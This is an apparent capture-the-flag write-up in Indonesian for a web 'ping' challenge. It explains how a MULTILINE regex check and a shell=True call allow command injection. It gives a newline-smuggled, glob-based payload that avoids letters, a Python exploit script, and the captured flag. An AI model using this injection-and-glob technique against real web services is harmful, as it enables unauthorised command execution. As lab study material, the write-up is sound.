# Ping Me

Target: https://web-ping-me.tracebash.xyz/

## Ringkas
Bug ada di validasi input backend. Filter regex pakai `re.match(r"^[\\d.]+$", ip, flags=re.MULTILINE)`.
Karena pakai `MULTILINE`, cukup baris pertama yang valid. Baris berikutnya bisa jadi command baru.

Input juga dibatasi 15 char dan huruf ditolak. Tapi glob shell masih bisa dipakai tanpa huruf.
`/app/readflag` bisa ditulis jadi `/???/????????` dan panjang total payload masih muat.

## Titik vuln
Potongan penting di `app.py`:

- cek huruf: `any(c.isalpha() for c in ip)`
- regex: `re.match(r"^[\d.]+$", ip, flags=re.MULTILINE)`
- eksekusi shell: `subprocess.check_output(command, shell=True, executable='/bin/bash', ...)`

Masalah inti:

1. `re.match(..., MULTILINE)` cuma butuh awal string cocok.
2. Newline tidak ditolak.
3. Input masuk ke `shell=True`.
4. Path binary bisa dibentuk pakai wildcard tanpa huruf.

## Ide exploit
Pakai payload dua baris:

`0\n/???/????????`

Baris 1:
- `0`
- lolos regex `^[\d.]+$`
- dipakai buat `ping`

Baris 2:
- `/???/????????`
- di-expand shell jadi `/app/readflag`
- binary SUID ini print env `FLAG`

Command final di server jadi bentuk begini:

`ping -c 1 -W 2 0`
`/app/readflag`

## Exploit
Command uji:

```bash
python3 - <<'PY'
import requests
url='https://web-ping-me.tracebash.xyz/api/ping'
payload='0\n/???/????????'
r=requests.post(url,data=payload,headers={'Content-Type':'text/plain'},timeout=10)
print(r.text)
PY
```

## Output
Response berisi hasil ping lalu flag:

```text
{"output":"PING 0 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms\n\n--- 0 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms\nTBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}\n"}
```

## Flag

```text
TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}
```

## Payload kenapa muat
Hitung panjang:

- `0` = 1
- `\n` = 1
- `/???/????????` = 13
- total = 15

Pas dengan limit input server.
